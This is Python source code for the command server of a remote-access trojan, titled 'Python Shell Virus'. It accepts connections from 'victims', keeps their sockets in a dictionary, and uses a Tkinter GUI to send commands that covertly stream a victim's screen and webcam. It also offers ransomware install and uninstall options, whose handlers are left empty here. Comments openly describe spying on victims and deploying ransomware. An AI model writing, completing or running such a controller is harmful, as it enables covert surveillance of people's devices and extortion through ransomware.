import socket
import threading
from host_constants import *
from constants import *
import tkinter as tk
import ScreenSharing.watcher.watcher as scWatcher
import WebCamSharing.watcher.watcher as wcWatcher
from time import sleep

victims = {} 
# How the dictionary looks like
# victims = {'127.0.0.1' : {'commands' : socket.socket, 'screenShare' : socket.socket, 'webCamShare' : socket.socket}}

def startServer():
    """
    Starts the server and accepting clients
    """

    print("Starting server...")
    print("Watiting for victims to connect...")

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(( HOST_IP,   HOST_PORT))
    server_socket.listen()

    while True:
        clientSoc, clientAddr = server_socket.accept()
        threading.Thread(target=handleVictim, args=(
            clientSoc, clientAddr, )).start()


def handleVictim(soc, socAddr):
    """
    Handle all the incoming sockets connections (victims)

    param 1: socket connection (new incoming connection)
    param 2: the address of the new incoming connection

    param 1 type: socket.socket
    param 2 type: tuple (IP, PORT)
    """
    
    """
    Before that you need to understand how the script works

    We have the [victims] dictionary, 
    this dictionary contains all the victims + their connections element

    What is the structure of the dictionary?
    Like this:

    {'127.0.0.1' : {COMMANDS_CHANNEL : socket.socket, SCREEN_SHARE_CHANNEL : socket.socket, WEB_CAM_SHARE_CHANNEL : socket.socket}}

    If a new victim will connect we will add him to the dictionary.
    his ip will be the key, and the value will be another dictionary

    The value dictionary build like this:
    {COMMANDS_CHANNEL : socket.socket, SCREEN_SHARE_CHANNEL : socket.socket, WEB_CAM_SHARE_CHANNEL : socket.socket}

    In our script we have some options
    - We can sends commands to the user
    - We can watch his screen 
    - We can watch his web camera

    Because we want to do several things in parallel and not to be stuck 
    For Example:
    Watch his screen, watch his web camera and install ransomware on his device in parallel

    But we can't send the screen sharing data and the web camera data
    into the same socket and to receive that correctly because the data will mixed 
    so for that we need to send each thing in diffrent socket connection

    so for that we have diffrent socket connection to each thing
    I call that channel

    COMMANDS_CHANNEL - the socket connection for the commands 
    SCREEN_SHARE_CHANNEL - the socket connection for the screen sharing data
    WEB_CAM_SHARE_CHANNEL - the socket connection for the web camera data

    
    So let's go back when a new victim is connecting we creating inside the [victims] dicionary a new key 
    with his ip (for example 10.10.10.10):

    victims = {"10:10:10:10" : None}



    The value to this key will be a new dictionary: 

    victims = {"10:10:10:10" : {}}



    Inside the value dictionary we will create a new key which called [COMMANDS_CHANNEL] and the value for that key will be
    the COMMANDS_CHANNEL socket connection which is the current socket object

    victims = {"10.10.10.10" : {COMMANDS_CHANNEL : socket.socket}}


    If we will send command to that victim to watch his screen
    the victim will connect to us by a new socket connection and will identify himself as that victim 
    but will tell us that this socket connection is for the SCREEN_SHARE_CHANNEL and we will add that to our victims dictionary

    victims = {"10.10.10.10" : {COMMANDS_CHANNEL : socket.socket, SCREEN_SHARE_CHANNEL : socket.socket}}

    

    same thing to the web camera sharing

    victims = {"10.10.10.10" : {COMMANDS_CHANNEL : socket.socket, SCREEN_SHARE_CHANNEL : socket.socket, WEB_CAM_SHARE_CHANNEL : socket.socket}}



    If the some of the channels will be disconnected we will remove him from the dictionary


    So [channelType] is string which tells which channel this new connection is for
    """
    channelType = soc.recv(CHANNEL_TYPE_LEN).decode()

    victimIp = socAddr[0]

    if victimIp not in list(victims):
        victims[victimIp] = dict()

    if channelType == COMMANDS_CHANNEL:
        print(f"{socAddr} Commands Channel Has been connected!")
        victims[victimIp][COMMANDS_CHANNEL] = soc

    elif channelType == SCREEN_SHARE_CHANNEL:
        print(f"{socAddr} Screen Sharing Channel Has been connected!")
        victims[victimIp][SCREEN_SHARE_CHANNEL] = soc

    elif channelType == WEB_CAM_SHARE_CHANNEL:
        print(f"{socAddr} Web Camera Sharing Channel Has been connected!")
        victims[victimIp][WEB_CAM_SHARE_CHANNEL] = soc


def processCommand(command, selectedVictim):
    """
    Process and executes the command

    param 1: the command
    param 2: the ip of the victim to apply the command on

    param 1 type: str
    param 2 type: str
    """

    print(f"command: {command}, victim: {selectedVictim}")

    print("Sending command!")
    sendCommand(command, victims[selectedVictim][COMMANDS_CHANNEL])
    print("Command has been sent!")

    if command ==  WATCH_SCREEN_COMMAND:
        threading.Thread(target= handleScreenSharing, args=(selectedVictim, )).start()

    elif command ==  WATCH_WEBCAM_COMMAND:
        threading.Thread(target= handleWebCameraSharing, args=(selectedVictim, )).start()

    elif command ==  INSTALL_RANSOMWARE_COMMAND:
        pass

    elif command ==  UNINSTALL_RANSOMWARE_COMMAND:
        pass


def handleScreenSharing(selectedVictim):
    """
    Executes the screen sharing command

    param 1: the socket object of the victim to apply the command on 
    param 1 type: socket.socket
    """

    while SCREEN_SHARE_CHANNEL not in victims[selectedVictim].keys():
        print("Waiting for the screen sharing channel to connect")
        sleep(1)

    scWatcher.watchScreen(victims[selectedVictim][SCREEN_SHARE_CHANNEL])

    # Closes the connection
    victims[selectedVictim][SCREEN_SHARE_CHANNEL].close()
    # Removes from the victims dictionary
    victims[selectedVictim].pop(SCREEN_SHARE_CHANNEL) 

def handleWebCameraSharing(selectedVictim):
    """
    Executes the web camera sharing command

    param 1: the socket object of the victim to apply the command on 
    param 1 type: socket.socket
    """


    while WEB_CAM_SHARE_CHANNEL not in victims[selectedVictim].keys():
        print("Waiting for the web camera sharing channel to connect")
        sleep(1)

    wcWatcher.watchWebCam(victims[selectedVictim][WEB_CAM_SHARE_CHANNEL])

    # Closes the connection
    victims[selectedVictim][WEB_CAM_SHARE_CHANNEL].close()
    # Removes from the victims dictionary
    victims[selectedVictim].pop(WEB_CAM_SHARE_CHANNEL) 


def sendCommand(command, victimSoc):
    """
    Sends the command to the victim

    param 1: the command
    param 2: the socket object of the victim to apply the command on 

    param 1 type: str
    param 2 type: socket.socket
    """
    victimSoc.send(command.encode())

def reloadWindow(window):
    """
    Reloads the GUI of the program

    For example when a new victim is connected we want to rebuild our ui 
    becusae we have to add the new victim to the victims list
    """

    print("Reloading UI...")
    window.destroy()
    buildUI()


def buildUI():
    """
    Builds the GUI of the program
    """
    
    print("Building UI...")

    window = tk.Tk()
    window.title("Python Shell Virus")

    # for scrolling vertically
    yscrollbar = tk.Scrollbar(window)
    yscrollbar.pack(side = tk.RIGHT, fill = tk.Y)

    # Headers Labels
    tk.Label(text="Welcome To The Python Virus Shell!").pack()
    tk.Label(text="What Would You Like To Do?").pack()


    # Opertaion list
    variable = tk.StringVar(window)
    variable.set("Watch Screen") # default value
    opertaionList = tk.OptionMenu(window, variable,  WATCH_SCREEN_COMMAND,  WATCH_WEBCAM_COMMAND,  INSTALL_RANSOMWARE_COMMAND,  UNINSTALL_RANSOMWARE_COMMAND)
    opertaionList.pack()

    # Victims list
    victims_list = tk.Listbox(window, selectmode = "single", 
                yscrollcommand = yscrollbar.set)
    # Widget expands horizontally and 
    # vertically by assigning both to
    # fill option
    victims_list.pack(padx = 10, pady = 10,
            expand = tk.YES, fill = "both")
    x = list(victims)
    
    for each_item in range(len(x)):
        victims_list.insert(tk.END, x[each_item])
        victims_list.itemconfig(each_item, bg = "lime")


    # Attach listbox to vertical scrollbar
    yscrollbar.config(command = victims_list.yview)

    # Start Button
    startBtn = tk.Button(
        text="Start!",
        command= lambda: processCommand(variable.get() ,victims_list.get(tk.ACTIVE)),
    )
    startBtn.pack()

    # Reload Button
    reloadBtn = tk.Button(
        text="Reload!",
        command= lambda : reloadWindow(window),
    )
    reloadBtn.pack()

    window.mainloop()




def main():
    threading.Thread(target=startServer).start()
    buildUI()    

if __name__ == "__main__":
    main()
